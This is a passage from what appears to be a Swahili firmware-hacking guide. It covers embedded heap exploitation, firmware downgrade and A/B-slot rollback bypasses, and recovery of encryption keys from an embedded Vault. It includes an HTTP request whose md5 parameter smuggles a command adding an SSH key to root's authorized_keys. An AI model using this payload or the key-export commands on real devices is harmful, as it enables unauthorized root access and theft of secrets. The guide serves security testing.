- Ukubwa wa packet-local ulioghushiwa unaokidhi ukaguzi mpya huku bado ukifurika buffer iliyotengwa awali.

Ikiwa njia iliyo hatarini iko nyuma ya commissioning logic, exploitation lazima ijumuishe **device emulation** ya kutosha ili kupeleka kifaa lengwa katika hali inayotarajiwa ya upakuaji wa model au blob kabla ya kutuma fragments zilizoharibika.

### Vichochezi vya `free()` vinavyoendeshwa na protocol

Katika embedded daemons, njia rahisi zaidi ya kuchochea heap metadata exploitation mara nyingi si "kusubiri cleanup", bali **kulazimisha ushughulikiaji wa makosa wa protocol yenyewe**:<sup>[[8]](#references)</sup>

- Tuma fragments za ufuatiliaji zilizoharibika ili kupeleka FSM kwenye hali za **retry** au **error**.
- Vuka kikomo cha retry ili daemon **iweke upya context** na kuachilia buffer iliyoharibiwa.
- Tumia `free()` hii inayotabirika kuchochea allocator-side primitives kabla mchakato haujaanguka kwa sababu zisizohusiana.

Hii ni muhimu hasa dhidi ya allocators za **musl/uClibc/dlmalloc-like** kwenye embedded Linux, ambako kuharibu chunk metadata kunaweza kubadilisha unlink/unbin logic na kuwa write primitive. Mbinu thabiti ni kuharibu **size field** ili kuelekeza allocator traversal kwenye **fake chunks zilizowekwa ndani ya buffer iliyofurika**, badala ya kuharibu mara moja bin pointers halisi na kusababisha mchakato kuanguka.

## Binary Exploitation and Proof-of-Concept

Kutengeneza PoC kwa udhaifu uliotambuliwa kunahitaji uelewa wa kina wa target architecture na ujuzi wa kuandika programu kwa lugha za kiwango cha chini. Kinga za binary runtime si za kawaida kwenye embedded systems, lakini zinapokuwepo, mbinu kama Return Oriented Programming (ROP) zinaweza kuhitajika.

### Maelezo ya u-exploit wa uClibc fastbin (embedded Linux)

- **Fastbins + consolidation:** uClibc hutumia fastbins zinazofanana na za glibc. Utengaji mkubwa unaofuata unaweza kuchochea `__malloc_consolidate()`, kwa hiyo fake chunk yoyote lazima ipite ukaguzi (ukubwa unaokubalika, `fd = 0`, na chunks za jirani zinazoonekana kuwa "in use").<sup>[[6]](#references)</sup>
- **Binaries zisizo PIE chini ya ASLR:** ikiwa ASLR imewashwa lakini binary kuu ni **non-PIE**, anwani za `.data/.bss` ndani ya binary huwa thabiti. Unaweza kulenga eneo ambalo tayari linafanana na heap chunk header halali ili kuweka fastbin allocation kwenye **function pointer table**.
- **NUL inayosimamisha parser:** JSON inapochanganuliwa, `\x00` kwenye payload inaweza kusimamisha uchanganuzi huku ikiweka byte zinazofuata zinazodhibitiwa na mshambuliaji kwa stack pivot/ROP chain.
- **Shellcode kupitia `/proc/self/mem`:** ROP chain inayotumia `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kupandikiza shellcode inayoweza kutekelezwa kwenye mapping inayojulikana na kurukia humo.

## Operating Systems Zilizotayarishwa kwa Uchambuzi wa Firmware

Operating systems kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira yaliyosanidiwa awali kwa majaribio ya usalama wa firmware, yakiwa na zana zinazohitajika.

## OS Zilizotayarishwa kwa Uchambuzi wa Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyoundwa kukusaidia kufanya tathmini ya usalama na penetration testing ya vifaa vya Internet of Things (IoT). Huokoa muda mwingi kwa kutoa mazingira yaliyosanidiwa awali yenye zana zote zinazohitajika.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operating system ya majaribio ya embedded security inayotegemea Ubuntu 18.04, ikiwa na zana za majaribio ya usalama wa firmware zilizopakiwa awali.

## Mashambulizi ya Firmware Downgrade na Mbinu za Usasishaji Zisizo Salama

Hata vendor anapoweka ukaguzi wa sahihi za kriptografia kwa firmware images, **ulinzi dhidi ya kurudisha toleo nyuma (downgrade) mara nyingi hukosekana**. Boot- au recovery-loader inapothibitisha tu sahihi kwa kutumia public key iliyopachikwa lakini hailinganishi *version* (au monotonic counter) ya image inayowekwa, mshambuliaji anaweza kusakinisha kihalali **firmware ya zamani iliyo hatarini ambayo bado ina sahihi halali**, na hivyo kurudisha udhaifu uliokuwa umerekebishwa.<sup>[[4]](#references)</sup>

Mtiririko wa kawaida wa shambulio:

1. **Pata image ya zamani yenye sahihi**
   * Ichukue kwenye tovuti ya umma ya vendor ya kupakua, CDN au tovuti ya usaidizi.
   * Itoe kwenye companion mobile/desktop applications (kwa mfano ndani ya Android APK chini ya `assets/firmware/`).
   * Ipate kwenye hazina za wahusika wengine kama VirusTotal, Internet archives, forums, n.k.
2. **Pakia au toa image kwa kifaa** kupitia channel yoyote ya usasishaji iliyo wazi:
   * Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
   * Vifaa vingi vya IoT vya watumiaji hufichua HTTP(S) endpoints *zisizohitaji uthibitishaji* zinazokubali firmware blobs zilizosimbwa kwa Base64, kuzifungua upande wa server na kuanzisha recovery/upgrade.
3. Baada ya downgrade, exploit udhaifu uliorekebishwa katika release mpya zaidi (kwa mfano kichujio cha command-injection kilichoongezwa baadaye).
4. Kwa hiari, weka image ya hivi karibuni tena au zima updates ili kuepuka kugunduliwa baada ya kupata persistence.

### Mfano: Command Injection Baada ya Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Katika firmware iliyo hatarini (iliyorejeshwa kwenye toleo la zamani), kigezo cha `md5` kinaunganishwa moja kwa moja kwenye amri ya shell bila kusafishwa, hivyo kuruhusu kuingiza amri zozote (hapa — kuwezesha ufikiaji wa root kwa kutumia ufunguo wa SSH). Matoleo ya baadaye ya firmware yaliongeza kichujio cha msingi cha herufi, lakini kukosekana kwa ulinzi dhidi ya kurejesha toleo la zamani kunafanya marekebisho hayo yasiwe na manufaa.<sup>[[4]](#references)</sup>

### Kutoa Firmware Kutoka Kwenye Programu za Simu

Wauzaji wengi hujumuisha picha kamili za firmware ndani ya programu zao saidizi za simu ili programu iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Vifurushi hivi kwa kawaida huhifadhiwa bila usimbaji fiche kwenye APK/APEX, chini ya njia kama `assets/fw/` au `res/raw/`. Zana kama `apktool`, `ghidra`, au hata `unzip` ya kawaida hukuwezesha kutoa picha zilizosainiwa bila kugusa kifaa halisi.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass ya anti-rollback kupitia updater pekee katika miundo ya slot za A/B

Baadhi ya vendors hutekeleza **ratchet** ya kuzuia downgrade, lakini huiweka tu ndani ya mantiki ya *updater* (kwa mfano, routine ya UDS kupitia CAN, amri ya recovery, au OTA agent ya userspace). Ikiwa **bootloader** hukagua tu signature/CRC ya image na kuamini partition table au metadata ya slot, ulinzi wa rollback bado unaweza kub bypass.<sup>[[7]](#references)</sup>

Muundo dhaifu wa kawaida:

- Metadata ya firmware ina maelezo ya version pamoja na **security ratchet** / counter inayoongezeka tu.
- Updater hulinganisha ratchet ya image na thamani iliyohifadhiwa kwenye hifadhi endelevu na kukataa image za zamani zilizosainiwa.
- **Bootloader** haiichambui ratchet hiyo; hukagua tu header, CRC na signature kabla ya kuwasha slot iliyochaguliwa.
- Uamilishaji wa slot huhifadhiwa kando katika partition table au counter ya generation ya kila slot na **hauunganishwi kwa njia ya kriptografia** na digest halisi ya firmware iliyothibitishwa.

Hii hutengeneza primitive ya **kuthibitisha image moja / kuwasha image nyingine** katika mifumo ya slot mbili. Mshambuliaji akiweza kuifanya updater itie alama slot B kuwa ndiyo itakayowashwa baadaye kwa kutumia image ya sasa iliyosainiwa, kisha akaandika upya slot B kabla ya kuwasha upya, bootloader inaweza bado kuwasha image iliyorejeshwa kwenye toleo la zamani kwa sababu huamini tu metadata ya slot iliyokwisha kuthibitishwa.

Mfumo wa kawaida wa matumizi mabaya:

1. Pakia firmware ya sasa iliyosainiwa kwenye slot isiyotumika, kisha endesha routine ya kawaida ya uthibitishaji/kubadilisha slot ili layout iiteue slot hiyo kuwa inayofuata kuwashwa.
2. **Usiwashwe upya bado**. Katika session hiyo hiyo, ingia tena kwenye routine ya kuandaa/kufuta slot.
3. Tumia vibaya hali ya zamani ya boot au mantiki ya kuchagua slot iliyopitwa na wakati ili updater ifute **slot ileile halisi** iliyokuwa imeteuliwa kuwa inayofuata kuwashwa.
4. Andika firmware ya zamani lakini bado iliyosainiwa kwenye slot hiyo.
5. Ruka routine ya uthibitishaji inayotekeleza ratchet na uwashe kifaa upya moja kwa moja.
6. Bootloader huchagua slot iliyoteuliwa, hukagua signature/integrity pekee, kisha huwasha image ya zamani.

Mambo ya kutafuta unapofanya reverse engineering ya utekelezaji wa masasisho ya A/B:

- Uchaguzi wa slot unaotokana na **flags za wakati wa kuwasha** ambazo hazisasishwi baada ya kubadilisha slot kwa mafanikio.
- Routine ya aina ya `prepare_passive_slot()` inayofuta slot kulingana na hali iliyopitwa na wakati badala ya **layout ya sasa iliyothibitishwa**.
- Function ya aina ya `part_write_layout()` inayoongeza tu **generation counter** / active flag na haihifadhi hash ya image iliyothibitishwa.
- Ukaguzi wa ratchet unaotekelezwa kwenye userspace au kwenye code ya updater, lakini **sio** katika hatua za ROM / bootloader / secure boot.
- Routine za kufuta au recovery zinazoiacha slot ikiwa imetiwa alama kuwa inaweza kuwashwa hata baada ya maudhui yake kufutwa na kuandikwa upya.

### Orodha ya Kukagua Mantiki ya Usasishaji

* Je, transport/authentication ya *update endpoint* inalindwa vya kutosha (TLS + authentication)?
* Je, kifaa hukagua **namba za version** au **monotonic anti-rollback counter** kabla ya kuandika firmware?
* Je, image huthibitishwa ndani ya secure boot chain (kwa mfano, signatures hukaguliwa na ROM code)?
* Je, **bootloader hutekeleza ratchet ileile** kama updater, badala ya kukagua signature/CRC pekee?
* Je, metadata ya uamilishaji wa slot **imefungamanishwa na digest/version ya firmware iliyothibitishwa**, au slot inaweza kubadilishwa baada ya kuteuliwa?
* Baada ya kubadilisha slot kwa mafanikio, je, kifaa hulazimishwa kuwashwa upya au routine za baadaye za usasishaji/kufuta bado zinaweza kufikiwa katika session hiyo hiyo?
* Je, code ya userland hufanya ukaguzi mwingine wa uhalali (kwa mfano, ramani ya partition inayoruhusiwa, namba ya model)?
* Je, njia za usasishaji za *sehemu* au za *backup* hutumia tena mantiki ileile ya uthibitishaji?

> 💡  Ikiwa lolote kati ya haya halipo, huenda platform inaweza kushambuliwa kwa rollback.

## Firmware dhaifu za kufanya mazoezi

Ili kufanya mazoezi ya kugundua udhaifu kwenye firmware, anza na miradi hii ya firmware dhaifu.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Kupata funguo za usimbuaji fiche wa firmware kutoka hali iliyopachikwa ya KMS/Vault

Image ya update inapochanganya metadata ndogo ya maandishi wazi na blob kubwa yenye entropy ya juu, chunguza muundo wa container kabla ya kujaribu brute force:<sup>[[1]](#references)</sup>

- Tupa headers, offsets na mipaka ya mistari kwa kutumia `hexdump`, `xxd`, `strings -tx`, `base64 -d`, na `binwalk -E`.
- `Salted__` kwa kawaida huashiria format ya OpenSSL `enc`: bytes 8 zinazofuata ni salt na bytes zilizobaki ni ciphertext.
- Field ya Base64 inayofasirika na kuwa na bytes `256` haswa ni kidokezo kikubwa kwamba unaangalia ciphertext ya RSA-2048 inayofunga password/random session key ya firmware.
- PGP material iliyotenganishwa iliyo kwenye faili hiyo hiyo mara nyingi hulinda authenticity pekee; usidhani ndiyo njia ya kulinda usiri.

Ikiwa utafutaji wa funguo za static (`grep`, `strings`, utafutaji wa PEM/PGP) haufanikiwi, fanya reverse engineering ya **njia halisi ya decryption** badala ya kutafuta private keys pekee:

- Decompile updater / management binary na ufuatilie ni nani anayesoma blob iliyosimbwa fiche, helper/API gani huifungua, na jina la kimantiki la key linaloombwa.
- Tafuta hali ya KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) pamoja na unit files na init scripts ndani ya root filesystem iliyotolewa.
- Chukulia plaintext ya `vault operator unseal ...`, recovery keys, bootstrap tokens, au scripts za local KMS auto-unseal kuwa sawa na private-key material.

Ikiwa kifaa kinajumuisha Vault binary asilia na storage backend, kuendesha tena mazingira hayo kwa kawaida ni rahisi kuliko kutekeleza upya vipengele vya ndani vya Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Ukiwa na root kwenye KMS iliyoklonwa:

- Fanya transit keys ziweze kuhamishwa nje ndani ya clone iliyotengwa pekee: `vault write transit/keys/<name>/config exportable=true`
- Hamisha unwrap key: `vault read transit/export/encryption-key/<name>`
- Jaribu RSA key iliyopatikana ukitumia jozi halisi ya padding/hash inayotumiwa na KMS. Kushindwa kwa decryption ya PKCS#1 v1.5 na kushindwa kwa decryption ya OAEP chaguomsingi **hakuthibitishi** kuwa key si sahihi; mifumo mingi inayotumia Vault hutumia OAEP yenye SHA-256, ilhali maktaba za kawaida hutumia SHA-1 kwa chaguomsingi.
- Ikiwa payload inaanza na `Salted__`, rudia KDF ya OpenSSL ya mtengenezaji kwa usahihi (`EVP_BytesToKey`, mara nyingi MD5 kwenye vifaa vya zamani) kabla ya kujaribu AES-CBC decryption.

Hii inabadilisha tatizo la "firmware iliyosimbwa kwa njia fiche" kuwa tatizo la jumla zaidi: **rejesha operational keys za upande wa appliance, kisha rudia vigezo halisi vya unwrap + KDF nje ya mtandao**.

## Mafunzo na Vyeti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Kuvunja Usimbaji wa Firmware kwa Claude: Ujuzi wa Kiwango cha Juu, Uhuru wa Kiwango cha Mwanzo](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Mbinu ya Kupima Usalama wa Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Udukuzi wa IoT kwa Vitendo: Mwongozo Mahususi wa Kushambulia Mtandao wa Vitu](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Kutumia zero days kwenye vifaa vilivyoachwa – blogu ya Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jinsi Kifaa Mahiri cha $20 Kilivyonipa Ufikiaji wa Nyumba Yako](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sasa Unaniona: Sasa Umedukuliwa](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Kutumia Kiunganishi cha Kuchaji cha Tesla Wall Connector - Sehemu ya 2: kukwepa ulinzi wa kushusha toleo](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Ifanye Iwake: Kutumia Philips Hue Bridge kupitia mtandao wa hewani](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS kwenye QEMU Sehemu ya 2: Kutatua Hitilafu na Kurekebisha](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [10] [Nenosiri za Dell BIOS: Usimbaji dhaifu wa XOR huruhusu urejeshaji kutoka SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [11] [R3n5k1/dellpwn - Zana za kurejesha nenosiri la Dell BIOS](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
